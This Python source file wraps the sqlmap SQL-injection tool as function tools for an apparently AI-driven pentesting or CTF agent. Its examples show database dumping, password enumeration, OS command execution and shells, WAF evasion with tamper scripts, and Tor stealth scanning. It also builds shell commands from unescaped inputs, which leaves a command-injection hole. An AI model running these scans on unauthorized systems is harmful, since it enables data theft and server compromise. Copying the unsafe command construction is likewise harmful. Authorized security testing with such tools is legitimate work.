"""
SQLMap - Automatic SQL Injection and Database Takeover Tool
==========================================================

SQLMap is an open source penetration testing tool that automates the
process of detecting and exploiting SQL injection flaws and taking over
of database servers.
"""

from kryon.sdk.agents import function_tool
from kryon.tools.common import run_command


@function_tool
def sqlmap_scan(
    url: str,
    data: str = "",
    cookie: str = "",
    method: str = "GET",
    headers: str = "",
    referer: str = "",
    user_agent: str = "",
    random_agent: bool = False,
    params: str = "",
    skip_params: str = "",
    dbms: str = "",
    os: str = "",
    level: int = 1,
    risk: int = 1,
    technique: str = "BEUSTQ",
    threads: int = 1,
    time_sec: int = 5,
    tamper: str = "",
    batch: bool = True,
    flush_session: bool = False,
    fresh_queries: bool = False,
    optimize: bool = True,
    keep_alive: bool = True,
    null_connection: bool = True,
    smart: bool = True,
    dbs: bool = False,
    tables: bool = False,
    columns: bool = False,
    dump: bool = False,
    dump_all: bool = False,
    current_user: bool = False,
    current_db: bool = False,
    is_dba: bool = False,
    users: bool = False,
    passwords: bool = False,
    privileges: bool = False,
    roles: bool = False,
    db: str = "",
    tbl: str = "",
    col: str = "",
    exclude_sysdbs: bool = True,
    sql_shell: bool = False,
    os_shell: bool = False,
    os_cmd: str = "",
    proxy: str = "",
    tor: bool = False,
    check_tor: bool = False,
    delay: int = 0,
    timeout: int = 30,
    retries: int = 3,
    randomize: str = "",
    safe_url: str = "",
    safe_post: str = "",
    safe_freq: int = 0,
    skip_static: bool = True,
    crawl: int = 0,
    crawl_exclude: str = "",
    forms: bool = False,
    csrf_token: str = "",
    csrf_url: str = "",
    verbose: int = 1,
    ctf=None,
) -> str:
    """
    Comprehensive SQL injection detection and exploitation.

    SQLMap automates detection and exploitation of SQL injection vulnerabilities,
    supporting MySQL, Oracle, PostgreSQL, MSSQL, SQLite, and many more databases.

    Args:
        url: Target URL (e.g., "http://example.com/page.php?id=1")
        data: POST data string
        cookie: HTTP Cookie header value
        method: HTTP method (GET, POST, PUT, etc.)
        headers: Extra headers (e.g., "Accept-Language: en\\nHost: example.com")
        referer: HTTP Referer header value
        user_agent: HTTP User-Agent header value
        random_agent: Use randomly selected HTTP User-Agent
        params: Testable parameter(s) (comma-separated)
        skip_params: Parameters to skip from testing
        dbms: Force DBMS (MySQL, Oracle, PostgreSQL, MSSQL, etc.)
        os: Force OS (Linux, Windows)
        level: Level of tests (1-5, default: 1)
        risk: Risk of tests (1-3, default: 1)
        technique: SQL injection techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
        threads: Max concurrent HTTP threads (default: 1)
        time_sec: Seconds to delay for time-based blind SQLi
        tamper: Tamper script(s) to evade WAF/IDS
        batch: Never ask for user input, use default behavior
        flush_session: Flush session files for current target
        fresh_queries: Ignore stored results in session file
        optimize: Optimize performance
        keep_alive: Use persistent HTTP connections
        null_connection: Retrieve page length without content
        smart: Conduct thorough tests only if positive heuristics
        dbs: Enumerate databases
        tables: Enumerate tables
        columns: Enumerate columns
        dump: Dump table entries
        dump_all: Dump all database tables
        current_user: Retrieve current database user
        current_db: Retrieve current database name
        is_dba: Detect if current user is DBA
        users: Enumerate database users
        passwords: Enumerate database user passwords
        privileges: Enumerate database user privileges
        roles: Enumerate database user roles
        db: Specific database to enumerate
        tbl: Specific table to enumerate
        col: Specific column to enumerate
        exclude_sysdbs: Exclude system databases
        sql_shell: Prompt for interactive SQL shell
        os_shell: Prompt for interactive OS shell
        os_cmd: Execute OS command
        proxy: HTTP proxy (e.g., "http://127.0.0.1:8080")
        tor: Use Tor anonymity network
        check_tor: Check if Tor is used properly
        delay: Delay between requests in seconds
        timeout: Request timeout in seconds
        retries: Number of retries on connection timeout
        randomize: Randomly change parameter value
        safe_url: URL to visit frequently during testing
        safe_post: POST data for safe URL
        safe_freq: Test requests between safe URL visits
        skip_static: Skip testing parameters with static values
        crawl: Crawl website starting from target URL (depth)
        crawl_exclude: Regexp to exclude pages when crawling
        forms: Parse and test forms on target URL
        csrf_token: Parameter holding anti-CSRF token
        csrf_url: URL to extract anti-CSRF token
        verbose: Verbosity level (0-6, default: 1)
        ctf: CTF context for execution

    Returns:
        str: SQL injection findings and database information

    Examples:
        # Basic SQL injection test
        sqlmap_scan(url="http://example.com/page.php?id=1")

        # POST request SQL injection
        sqlmap_scan(
            url="http://example.com/login.php",
            data="username=admin&password=test",
            method="POST"
        )

        # Aggressive scan with higher risk/level
        sqlmap_scan(
            url="http://example.com/page.php?id=1",
            level=5,
            risk=3,
            threads=10
        )

        # Database enumeration
        sqlmap_scan(
            url="http://example.com/page.php?id=1",
            dbs=True,
            current_user=True,
            is_dba=True
        )

        # Dump specific database
        sqlmap_scan(
            url="http://example.com/page.php?id=1",
            db="database_name",
            tables=True,
            dump=True
        )

        # WAF bypass with tamper scripts
        sqlmap_scan(
            url="http://example.com/page.php?id=1",
            tamper="space2comment,between",
            random_agent=True
        )

        # Authenticated scan
        sqlmap_scan(
            url="http://example.com/page.php?id=1",
            cookie="PHPSESSID=abc123; user=admin",
            headers="Authorization: Bearer token123"
        )

        # Crawl and test all forms
        sqlmap_scan(
            url="http://example.com/",
            crawl=3,
            forms=True,
            batch=True
        )

        # OS command execution
        sqlmap_scan(
            url="http://example.com/page.php?id=1",
            os_cmd="whoami",
            technique="U"
        )

        # Stealth scan through Tor
        sqlmap_scan(
            url="http://example.com/page.php?id=1",
            tor=True,
            check_tor=True,
            delay=3,
            random_agent=True
        )

    Level Details (--level):
        1: Limited tests, basic injections
        2: More tests, cookie testing
        3: Header testing (User-Agent, Referer)
        4: Host header testing
        5: Comprehensive testing

    Risk Details (--risk):
        1: Safe tests only
        2: Heavy query time-based tests
        3: OR-based tests (may modify data)

    Tamper Scripts (WAF Bypass):
        - apostrophemask: Replace apostrophe with UTF-8
        - base64encode: Base64 encode payload
        - between: Replace > with NOT BETWEEN
        - chardoubleencode: Double URL-encode
        - charencode: URL-encode
        - charunicodeencode: Unicode-encode
        - equaltolike: Replace = with LIKE
        - greatest: Replace > with GREATEST
        - halfversionedmorekeywords: Add MySQL comments
        - ifnull2ifisnull: Replace IFNULL with IF(ISNULL())
        - modsecurityversioned: Add MySQL comments for ModSecurity
        - modsecurityzeroversioned: Add MySQL comments
        - multiplespaces: Add multiple spaces
        - percentage: Add % before characters
        - randomcase: Random case
        - randomcomments: Add random comments
        - space2comment: Replace space with comments
        - space2dash: Replace space with --
        - space2hash: Replace space with #
        - space2morehash: Replace space with # and random string
        - space2mssqlblank: Replace space with valid alternative
        - space2mssqlhash: Replace space with # and newline
        - space2mysqlblank: Replace space with valid alternative
        - space2mysqldash: Replace space with -- and newline
        - space2plus: Replace space with +
        - space2randomblank: Replace space with random blank
        - unionalltounion: Replace UNION ALL SELECT with UNION SELECT
        - unmagicquotes: Replace quote with multi-byte combo
        - versionedkeywords: Add MySQL version comments
        - versionedmorekeywords: Add MySQL version comments

    Note:
        SQLMap should only be used on systems you have permission to test.
        Unauthorized testing is illegal.
    """
    # Build sqlmap command
    cmd_parts = ["sqlmap", "-u", f'"{url}"']

    # Request options
    if data:
        cmd_parts.extend(["--data", f'"{data}"'])

    if method != "GET":
        cmd_parts.extend(["--method", method])

    if cookie:
        cmd_parts.extend(["--cookie", f'"{cookie}"'])

    if headers:
        cmd_parts.extend(["--headers", f'"{headers}"'])

    if referer:
        cmd_parts.extend(["--referer", f'"{referer}"'])

    if user_agent:
        cmd_parts.extend(["--user-agent", f'"{user_agent}"'])
    elif random_agent:
        cmd_parts.append("--random-agent")

    # Parameter testing
    if params:
        cmd_parts.extend(["-p", params])

    if skip_params:
        cmd_parts.extend(["--skip", skip_params])

    # Detection
    if dbms:
        cmd_parts.extend(["--dbms", dbms])

    if os:
        cmd_parts.extend(["--os", os])

    cmd_parts.extend(["--level", str(level), "--risk", str(risk)])

    if technique != "BEUSTQ":
        cmd_parts.extend(["--technique", technique])

    # Performance
    cmd_parts.extend(["--threads", str(threads)])
    cmd_parts.extend(["--time-sec", str(time_sec)])

    # Evasion
    if tamper:
        cmd_parts.extend(["--tamper", tamper])

    # Optimization
    if batch:
        cmd_parts.append("--batch")

    if flush_session:
        cmd_parts.append("--flush-session")

    if fresh_queries:
        cmd_parts.append("--fresh-queries")

    if optimize:
        cmd_parts.append("--optimize")

    if keep_alive:
        cmd_parts.append("--keep-alive")

    if null_connection:
        cmd_parts.append("--null-connection")

    if smart:
        cmd_parts.append("--smart")

    # Enumeration
    if dbs:
        cmd_parts.append("--dbs")

    if tables:
        cmd_parts.append("--tables")

    if columns:
        cmd_parts.append("--columns")

    if dump:
        cmd_parts.append("--dump")

    if dump_all:
        cmd_parts.append("--dump-all")

    if current_user:
        cmd_parts.append("--current-user")

    if current_db:
        cmd_parts.append("--current-db")

    if is_dba:
        cmd_parts.append("--is-dba")

    if users:
        cmd_parts.append("--users")

    if passwords:
        cmd_parts.append("--passwords")

    if privileges:
        cmd_parts.append("--privileges")

    if roles:
        cmd_parts.append("--roles")

    # Specific targeting
    if db:
        cmd_parts.extend(["-D", db])

    if tbl:
        cmd_parts.extend(["-T", tbl])

    if col:
        cmd_parts.extend(["-C", col])

    if exclude_sysdbs:
        cmd_parts.append("--exclude-sysdbs")

    # Access
    if sql_shell:
        cmd_parts.append("--sql-shell")

    if os_shell:
        cmd_parts.append("--os-shell")

    if os_cmd:
        cmd_parts.extend(["--os-cmd", f'"{os_cmd}"'])

    # Proxy/Tor
    if proxy:
        cmd_parts.extend(["--proxy", proxy])

    if tor:
        cmd_parts.append("--tor")

    if check_tor:
        cmd_parts.append("--check-tor")

    # Timing
    if delay > 0:
        cmd_parts.extend(["--delay", str(delay)])

    cmd_parts.extend(["--timeout", str(timeout)])
    cmd_parts.extend(["--retries", str(retries)])

    # Randomization
    if randomize:
        cmd_parts.extend(["--randomize", randomize])

    # Safe URL
    if safe_url:
        cmd_parts.extend(["--safe-url", safe_url])
        if safe_post:
            cmd_parts.extend(["--safe-post", safe_post])
        if safe_freq > 0:
            cmd_parts.extend(["--safe-freq", str(safe_freq)])

    # Crawling
    if skip_static:
        cmd_parts.append("--skip-static")

    if crawl > 0:
        cmd_parts.extend(["--crawl", str(crawl)])

    if crawl_exclude:
        cmd_parts.extend(["--crawl-exclude", crawl_exclude])

    if forms:
        cmd_parts.append("--forms")

    # CSRF
    if csrf_token:
        cmd_parts.extend(["--csrf-token", csrf_token])

    if csrf_url:
        cmd_parts.extend(["--csrf-url", csrf_url])

    # Verbosity
    if verbose > 1:
        cmd_parts.extend(["-v", str(verbose)])

    command = " ".join(cmd_parts)
    return run_command(command, ctf=ctf)


@function_tool
def sqlmap_crawl(
    url: str,
    depth: int = 2,
    forms: bool = True,
    cookie: str = "",
    threads: int = 5,
    batch: bool = True,
    ctf=None,
) -> str:
    """
    Crawl website and automatically test discovered forms and parameters.

    Args:
        url: Starting URL to crawl
        depth: Crawl depth (default: 2)
        forms: Parse and test forms
        cookie: Session cookie for authenticated crawling
        threads: Number of threads
        batch: Batch mode
        ctf: CTF context

    Returns:
        str: SQL injection findings from crawl

    Examples:
        # Crawl and test all forms
        sqlmap_crawl(url="http://example.com/")

        # Authenticated crawl
        sqlmap_crawl(
            url="http://example.com/",
            cookie="PHPSESSID=abc123",
            depth=3
        )
    """
    return sqlmap_scan(url=url, crawl=depth, forms=forms, cookie=cookie, threads=threads, batch=batch, ctf=ctf)


@function_tool
def sqlmap_request(
    request_file: str,
    batch: bool = True,
    level: int = 1,
    risk: int = 1,
    threads: int = 1,
    tamper: str = "",
    dbs: bool = False,
    dump: bool = False,
    ctf=None,
) -> str:
    """
    Test SQL injection using a saved HTTP request file (from Burp Suite, etc.).

    Args:
        request_file: Path to HTTP request file
        batch: Batch mode
        level: Test level (1-5)
        risk: Test risk (1-3)
        threads: Number of threads
        tamper: Tamper scripts
        dbs: Enumerate databases
        dump: Dump data
        ctf: CTF context

    Returns:
        str: SQL injection test results

    Examples:
        # Test request from Burp Suite
        sqlmap_request(
            request_file="/tmp/burp_request.txt",
            level=3,
            risk=2,
            dbs=True
        )
    """
    cmd_parts = [
        "sqlmap",
        "-r",
        request_file,
        f"--level {level}",
        f"--risk {risk}",
        f"--threads {threads}",
    ]

    if batch:
        cmd_parts.append("--batch")

    if tamper:
        cmd_parts.extend(["--tamper", tamper])

    if dbs:
        cmd_parts.append("--dbs")

    if dump:
        cmd_parts.append("--dump")

    command = " ".join(cmd_parts)
    return run_command(command, ctf=ctf)
